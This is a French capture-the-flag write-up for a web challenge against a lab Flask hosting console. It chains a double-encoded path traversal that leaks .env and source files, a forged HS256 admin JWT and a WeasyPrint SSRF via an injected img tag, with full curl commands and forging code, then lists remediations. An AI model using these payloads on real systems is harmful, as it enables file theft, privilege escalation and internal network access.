# AIZEN

[Accueil](../../README.md) · [Web](../README.md) · [Index](../../INDEX.md)

## Informations générales

| Champ | Valeur |
|---|---|
| Nom | AIZEN |
| Compétition | HackerLab Bénin 2026 |
| Catégorie de classement | Web |
| Difficulté | Hard, selon le compte rendu |
| Points | 200 |
| Auteur | Non documenté |
| Statut | **Partial** |
| Technologies | Flask, JWT HS256, WeasyPrint, SSRF |
| Validation | Signalement local uniquement (reported) |

## 1. Introduction

Atteindre le service d’audit interne depuis la console Vantage Hosting.

Cette édition reconstruit les travaux conservés. Les commandes citées sont historiques, sauf mention explicite d’un contrôle documentaire local. Aucune cible n’a été contactée lors de la rédaction. Les paramètres d’accès et les réponses sont expurgés ; les remplacer depuis les artefacts autorisés pour une reproduction en laboratoire.

**Limites et corrections de cette édition.** Le dossier local ne contient que des pages et des données de session ; la chaîne détaillée provient du compte rendu local du hub. Les fichiers app.py, .env et le PDF exporté cités dans ce récit ne sont pas conservés ici. La validation par quatre dérivés est rapportée, pas recalculée.

## 2. Énoncé du challenge

- Récupérer la réponse servie par le service d’audit interne.

## 3. Analyse initiale

5 fichiers rattachés directement à ce dossier. Voir l’[inventaire des pièces](evidence/manifest.md), qui indique leur chemin d’origine, leur taille et la décision de publication. Les pièces partagées sont référencées dans les questions apparentées, sans recopier les archives.

### 1. État initial et objectif

Source : [compte rendu du hub](evidence/hub-49638.txt)

L'énoncé fournit un compte client `contact@example.invalid` / `guest` sur une console
d'hébergement (« Vantage Hosting », ZEL de Mirova). Aucun accès à l'infrastructure.
Le drapeau est réputé se trouver côté serveur, dans un service d'audit qui n'écoute que
sur la boucle locale. Il faut donc :

1. obtenir un accès plus privilégié que le compte invité ;
2. provoquer une requête sortante depuis le serveur vers son propre `127.0.0.1:8080`.

Le fingerprint applicatif (bandeau `v3.2.1-mirova`, en-têtes Werkzeug) indique une
application Flask/Python 3.11.

---

## 4. Reconnaissance et investigation

### 2. Reconnaissance

Source : [compte rendu du hub](evidence/hub-49638.txt)

### 2.1 Connexion invité

```bash
curl -s -c cookies.txt -o /dev/null -w '%{http_code}\n' \
  -X POST http://172.28.19.2:5000/login \
  --data-urlencode 'email=contact@example.invalid' \
  --data-urlencode 'password=<SECRET_EXPURGE>'
```

Réponse `302` vers `/`. Le cookie `session_token` est un JWT HS256 :

```json
{"sub": 1, "email": "contact@example.invalid", "role": "client", "name": "..."}
```

### 2.2 Cartographie de la console

Les routes visibles : `/vaults`, `/billing`, `/api-keys`, `/support`, `/settings`,
`/docs`, et surtout `/vault/<vid>` avec un onglet *Fichiers* dont le téléchargement
passe par `/vault/<vid>/download?f=…`.

Le compte invité voit trois coffres : **3**, **27**, **28** (coffres « partagés »).
Les fichiers listés sont des leurres (placeholders), d'où l'intérêt de sortir du
répertoire du coffre.

### 2.3 Fuite de code source par la même primitive

Le endpoint de téléchargement a permis de lire les fichiers de l'application
(`/app/app.py`, `/app/templates/report_pdf.html`, `/app/entrypoint.sh`), ce qui a
donné le détail exact des contrôles à contourner.

---

## 5. Identification du mécanisme

Le double décodage intervient après le filtre de chemin, permettant une lecture de configuration. Le secret HS256 exposé permet de signer un rôle administrateur ; le rendu PDF charge ensuite une ressource de boucle locale injectée dans la description.

### 3. Vulnérabilité 1 — path traversal avec double décodage

Source : [compte rendu du hub](evidence/hub-49638.txt)

Code réellement déployé (`/app/app.py`) :

```python
fname = request.args.get('f', '')
if not fname:
    abort(400)
if '..' in fname or fname.startswith('/'):     # contrôle sur la valeur BRUTE
    abort(403)
decoded = urllib.parse.unquote(fname)          # 2e décodage applicatif
target = os.path.join(VAULTS_DIR, str(vid), decoded)
real = os.path.realpath(target)
if real.startswith(('/proc', '/sys', '/dev')): # garde-fou très partiel
    abort(403)
return send_file(target, ...)
```

Deux erreurs se combinent :

* le filtre inspecte la chaîne **avant** `unquote()`, alors que le fichier est ouvert
  **après** ;
* `os.path.join(VAULTS_DIR, str(vid), decoded)` : si `decoded` est absolu, Python
  ignore les segments précédents et retourne `decoded` tel quel.

Flask décode déjà l'URL une première fois. Il suffit donc de **double-encoder** le `%`
pour que la valeur vue par le filtre soit inoffensive et que `unquote()` reconstruise
le chemin absolu.

| Paramètre envoyé | vu par Flask / le filtre | après `unquote()` | Résultat |
|---|---|---|---|
| `f=%2fapp%2f.env` | `/app/.env` | `/app/.env` | **403** (commence par `/`) |
| `f=%252fapp%252f.env` | `%2fapp%2f.env` | `/app/.env` | **200** — lecture |
| `f=..%2f..%2fapp.py` | `../../app.py` | idem | **403** (`..`) |
| `f=%252e%252e%252f%252e%252e%252fapp.py` | `%2e%2e%2f…` | `../../app.py` | 200 (variante) |

Commande utilisée (le cookie est celui de la session invitée) :

```bash
C=$(grep session_token cookies.txt | awk '{print $7}')

# témoin : simple encodage -> refusé
curl -s -o /dev/null -w '%{http_code}\n' -b "session_token=$C" \
  "http://172.28.19.2:5000/vault/3/download?f=%2fapp%2f.env"
# 403

# double encodage -> accepté
curl -s -b "session_token=$C" \
  "http://172.28.19.2:5000/vault/3/download?f=%252fapp%252f.env" \
  -o env_leak.txt -w '%{http_code} %{size_download}\n'
# 200 493
```

Le coffre 3 est accessible à l'invité (visibilité *shared*), le contrôle d'appartenance
en amont ne bloque donc pas.

### 3.1 Contenu du `.env` (valeurs sensibles masquées ici)

```dotenv
JWT_SECRET=<REDACTED>
DATABASE_URL=sqlite:///vantage.db
FLASK_ENV=production
VANTAGE_REGION=mirova-1
BOREALIS_CA_ENDPOINT=https://portal.borealisca.nv/api/v2
BOREALIS_API_KEY=<SECRET_EXPURGE>
INTERNAL_AUDIT_SERVICE=http://127.0.0.1:8080
BACKUP_ENCRYPTION_KEY=aes256_mk_<REDACTED>
SMTP_HOST=mail.vantage-hosting.kt
SMTP_PORT=587
SMTP_USER=contact@example.invalid
SMTP_PASS=<REDACTED>
```

Deux informations décisives :

* `JWT_SECRET` — la clé HS256 de signature des jetons de session ;
* `INTERNAL_AUDIT_SERVICE=http://127.0.0.1:8080` — le service à atteindre (boucle
  locale uniquement).

La même technique récupère `/app/app.py` et `/app/templates/report_pdf.html` :

```bash
enc() { python3 -c \
  "import urllib.parse,sys;print(urllib.parse.quote(urllib.parse.quote(sys.argv[1],safe=''),safe=''))" "$1"; }
curl -s -b "session_token=$C" \
  "http://172.28.19.2:5000/vault/3/download?f=$(enc /app/app.py)" -o leak_app.py
curl -s -b "session_token=$C" \
  "http://172.28.19.2:5000/vault/3/download?f=$(enc /app/templates/report_pdf.html)" \
  -o leak_report_pdf.html
```

---

### 4. Vulnérabilité 2 — JWT admin forgé (signature seule vérifiée)

Source : [compte rendu du hub](evidence/hub-49638.txt)

```python
def admin_required(f):
    @wraps(f)
    def dec(*a, **kw):
        tok = request.cookies.get('session_token')
        if not tok:
            return redirect(url_for('login'))
        data = read_token(tok)               # uniquement signature + exp
        if not data or data.get('role') != 'admin':
            abort(403)
        ...
```

`read_token()` ne fait que `jwt.decode(tok, JWT_SECRET, algorithms=['HS256'])` :
aucune vérification d'existence de l'utilisateur, de révocation, ni de cohérence
entre `sub`, `email` et `role`. Le secret étant fuité, on signe un jeton admin
arbitraire :

```python
import datetime, jwt
now = datetime.datetime.now(datetime.timezone.utc)
tok = jwt.encode({
    "sub": 2, "email": "contact@example.invalid", "role": "admin",
    "name": "Yara Mensah",
    "iat": now, "exp": now + datetime.timedelta(hours=8),
}, SECRET, algorithm="HS256")
```

Vérification de l'élévation :

```bash
ADMIN=$(cat admin_token.txt)
for p in /backups /network /certificates; do
  curl -s -b "session_token=$ADMIN" -o /dev/null -w "$p %{http_code}\n" "http://172.28.19.2:5000$p"
done
# /backups 200, /network 200, /certificates 200  (contre 403 avec le jeton client)
```

---

### 5. Vulnérabilité 3 — SSRF via WeasyPrint dans l'export PDF

Source : [compte rendu du hub](evidence/hub-49638.txt)

Le panneau admin expose `/admin/vault/<vid>/settings` (POST `description`) et
`/admin/vault/<vid>/export`. Le template `report_pdf.html` affiche la description
**sans échappement** :

```jinja
<div class="section-notes">{{ vault['description'] | safe }}</div>
```

et l'export fait :

```python
html = render_template('report_pdf.html', vault=vault, files=files, logs=logs, ...)
pdf = weasyprint.HTML(string=html).write_pdf()
```

WeasyPrint interprète le HTML puis **va chercher les ressources distantes**
(images, CSS, polices) au moment du rendu. Une balise `<img>` suffit donc à forcer
le serveur à émettre une requête HTTP arbitraire — ici vers lui-même :

```bash
ADMIN=$(cat admin_token.txt)

curl -s -b "session_token=$ADMIN" -o /dev/null -w '%{http_code}\n' \
  -X POST http://172.28.19.2:5000/admin/vault/3/settings \
  --data-urlencode 'description=<img src="http://127.0.0.1:8080/flag.svg">'
# 302

curl -s -b "session_token=$ADMIN" -o audit3.pdf \
  -w '%{http_code} %{size_download} %{content_type}\n' \
  http://172.28.19.2:5000/admin/vault/3/export
# 200 21400 application/pdf
```

Le service d'audit (`127.0.0.1:8080`, absent de l'extérieur) répond avec un SVG
contenant le drapeau ; WeasyPrint le rasterise dans le PDF. Il ne reste qu'à lire
le texte du PDF :

```bash
pdftotext -layout audit3.pdf - | grep -aE '<REPONSE_EXPURGEE>
```

Nettoyage immédiat de la description pour ne pas laisser de payload stocké :

```bash
curl -s -b "session_token=$ADMIN" -o /dev/null \
  -X POST http://172.28.19.2:5000/admin/vault/3/settings \
  --data-urlencode 'description='
```

---

## 6. Exploitation ou résolution

### AIZEN — Vantage Hosting (web, hard, 200 pts)

Source : [compte rendu du hub](evidence/hub-49638.txt)

**Plateforme :** HackerLab / HLB2026
**Cible :** `http://172.28.19.2:5000`
**Objectif :** récupérer le drapeau au format `HLB2026` + accolades, servi par le service d'audit interne non exposé sur le réseau.

---

### 6. Détermination de la valeur exacte (sans publier le secret)

Source : [compte rendu du hub](evidence/hub-49638.txt)

Le texte extrait du PDF peut subir des artefacts de rendu. Plutôt que de faire
confiance à `pdftotext`, la valeur a été **validée cryptographiquement** grâce à
`/app/entrypoint.sh`, récupéré par la même traversée :

```sh
FLAG="${FLAG:-<valeur par défaut>}"
jwt_secret=<SECRET_EXPURGE>
backup_key=$(printf '%s:backup' "$FLAG" | sha256sum | cut -c1-48)
borealis_key=$(printf '%s:borealis' "$FLAG" | sha256sum | cut -c1-32)
smtp_pass=$(printf '%s:smtp' "$FLAG" | sha256sum | cut -c1-16)
```

Le `.env` contient donc quatre dérivés du drapeau. En testant les variantes
d'accolades possibles, une seule satisfait **les quatre** contraintes simultanément
(`sha256(FLAG + ":jwt")[:48]`, `… ":backup"[:48]`, `… ":borealis"[:32]`,
`… ":smtp"[:16]`) :

```python
import hashlib, re
env = open('env_leak.txt').read()
assert hashlib.sha256((cand + ":jwt").encode()).hexdigest()[:48]      == jwt_from_env
assert hashlib.sha256((cand + ":backup").encode()).hexdigest()[:48]   == backup_from_env
assert hashlib.sha256((cand + ":borealis").encode()).hexdigest()[:32] == borealis_from_env
assert hashlib.sha256((cand + ":smtp").encode()).hexdigest()[:16]     == smtp_tail_from_env
```

La forme retenue comporte une accolade fermante supplémentaire (particularité du
déploiement, pas un artefact d'extraction : elle est prouvée par les hachages).
La valeur soumise est désignée ci-dessous par « **the submitted answer** ».

---

### 7. Chaîne complète

Source : [compte rendu du hub](evidence/hub-49638.txt)

1. `guest` → `/login`, JWT client ;
2. `/vault/3/download?f=%252fapp%252f.env` → `JWT_SECRET` + `INTERNAL_AUDIT_SERVICE` ;
3. JWT HS256 forgé `role=admin` → `/backups`, `/network`, `/certificates` en 200 ;
4. description du coffre 3 = `<img src="http://127.0.0.1:8080/flag.svg">` (`| safe`) ;
5. `/admin/vault/3/export` → WeasyPrint récupère l'URL interne → drapeau dans le PDF ;
6. extraction du texte + validation par les quatre dérivés `sha256` de `entrypoint.sh`.

---

### 9. Procédure de validation reproductible (sans le drapeau)

Source : [compte rendu du hub](evidence/hub-49638.txt)

1. Se connecter en invité et vérifier le refus du simple encodage :
   `GET /vault/3/download?f=%2fapp%2f.env` → `403`.
2. Vérifier l'acceptation du double encodage :
   `GET /vault/3/download?f=%252fapp%252f.env` → `200`, corps `JWT_SECRET=<SECRET_EXPURGE>`
3. Récupérer `/app/entrypoint.sh` par la même primitive et constater les quatre
   dérivations `sha256(FLAG + ":jwt" | ":backup" | ":borealis" | ":smtp")`.
4. Forger un JWT HS256 avec `role=admin` et le `JWT_SECRET` lu, puis confirmer
   `GET /backups` → `200` (au lieu de `403`).
5. Injecter `<img src="http://127.0.0.1:8080/flag.svg">` dans la description du
   coffre 3, appeler `/admin/vault/3/export` : le PDF doit exister et contenir le
   rendu de l'URL interne (comparer avec une description vide : le PDF ne contient
   alors aucune ressource `127.0.0.1:8080`).
6. Contrôle indépendant : recalculer les quatre hachages sur le candidat extrait ;
   ils doivent correspondre exactement aux valeurs du `.env`. C'est cette étape,
   et non l'OCR du PDF, qui authentifie la valeur.
7. Remettre la description du coffre à vide après l'exploitation.

---

## 7. Scripts et automatisation

Aucun script autonome rattaché directement à cette question. Les commandes intégrées aux notes sont reproduites lorsqu’elles existent ; elles ne sont pas déclarées testées dans cette édition.

## 8. Questions et flags

Les réponses ne sont pas publiées, conformément à la règle locale de non-divulgation. Un signalement au hub ne vaut pas acceptation par la compétition.

| Question / objectif | Méthode et preuve | Réponse | Validation |
|---|---|---|---|
| Récupérer la réponse servie par le service d’audit interne. | Voir la reconstruction et les sources de ce dossier. | Non reproduite / inconnue si non résolue | Signalement local uniquement (reported) |

## 9. Difficultés rencontrées

### 8. Pistes qui n'ont pas abouti (et pourquoi)

Source : [compte rendu du hub](evidence/hub-49638.txt)

* **Traversée simple** `f=%2fapp%2f.env` ou `f=../../../app.py` → `403` immédiat :
  le filtre travaille sur la chaîne encodée, il faut le double décodage.
* **`/entrypoint.sh` à la racine** → `404` : le script est en `/app/entrypoint.sh`.
  Piège annexe : deux téléchargements dans le même répertoire avec `basename`
  identique se sont écrasés, ce qui a d'abord fait croire à un fichier introuvable.
* **Écriture de fichier via le coffre** : l'interface n'expose que la description,
  pas d'upload ; le seul « sink » exploitable est le moteur de template PDF.
* **Lire le flag directement par traversée** (`/flag`, `/app/flag`) → absent :
  le drapeau n'est pas sur le système de fichiers, il est servi par le démon d'audit.
* **Tester `/admin/vault/3/export` avec le jeton client** → `403`, l'export est bien
  réservé au rôle admin (le contrôle est correct, seule la clé de signature manquait).
* **Compter sur `pdftotext` seul** : le rendu SVG/PDF peut altérer la ponctuation,
  d'où la validation par hachage.

---

## 10. Analyse technique approfondie

Le double décodage intervient après le filtre de chemin, permettant une lecture de configuration. Le secret HS256 exposé permet de signer un rôle administrateur ; le rendu PDF charge ensuite une ressource de boucle locale injectée dans la description. Les critères de validation doivent porter sur les données produites, pas seulement sur l’absence d’erreur d’un outil.

## 11. Remédiations

Valider le chemin normalisé dans sa racine autorisée, renouveler les secrets exposés et appliquer un chargeur de ressources restreint au moteur PDF. Ne pas supposer l’existence d’une option CLI universelle --no-network pour WeasyPrint ; la mesure doit être mise en œuvre dans le chargeur et l’isolation réseau.

### 10. Correctifs attendus

Source : [compte rendu du hub](evidence/hub-49638.txt)

* Ne jamais construire un chemin avec `os.path.join` sur une entrée utilisateur :
  comparer `realpath` à la racine du coffre (`commonpath`) et refuser les chemins
  absolus **après** décodage, pas avant.
* Décoder une seule fois, au même endroit, et valider le résultat ; ne pas mélanger
  validation sur brut et usage sur décodé.
* Refuser les noms de fichiers contenant `/` ou `\` après normalisation.
* Sortir les secrets du conteneur applicatif (Vault/KMS) : un `.env` lisible par
  l'application est lisible par toute faille de lecture de fichier.
* Vérifier la clé **et** l'identité côté serveur (recherche de l'utilisateur,
  révocation, `aud`/`iss`), ne pas se contenter de `role` dans le jeton.
* WeasyPrint : désactiver le chargement de ressources distantes (`url_fetcher` restreint et isolation réseau) et échapper systématiquement le HTML utilisateur ;
  un `|safe` sur un champ éditable est une SSRF immédiate.
* Segmenter : le service d'audit ne devrait pas être joignable depuis le conteneur web.

## 12. Conclusion

Atteindre le service d’audit interne depuis la console Vantage Hosting. La documentation disponible permet une reconstruction détaillée. Statut retenu : Partial. Signalement local uniquement (reported).

### 11. Leçons

Source : [compte rendu du hub](evidence/hub-49638.txt)

* Un contrôle sur une chaîne **avant** décodage est un contrôle décoratif : le
  double encodage (`%25`) est le premier réflexe à tester sur tout `unquote()`.
* `os.path.join` + chemin absolu = échappement silencieux de la racine.
* Un JWT n'est pas une autorisation : la signature prouve l'émetteur, pas les droits.
* Les moteurs de rendu (WeasyPrint, wkhtmltopdf, navigateurs headless) sont des
  clients HTTP privilégiés : tout HTML utilisateur y devient une SSRF.
* Toujours authentifier le résultat final (ici par dérivation de hachages) plutôt
  que de dépendre d'une extraction de texte faillible.

## 13. Références

Les références sont les pièces locales ci-dessous. Les références Internet citées dans les notes restent historiques et n’ont pas été consultées pendant cette mission.

- [Compte rendu CTFHUB](evidence/hub-49638.txt) — origine : `hub:49638`.

- [Inventaire local des pièces](evidence/manifest.md).
- [Retour à l’index](../../INDEX.md).

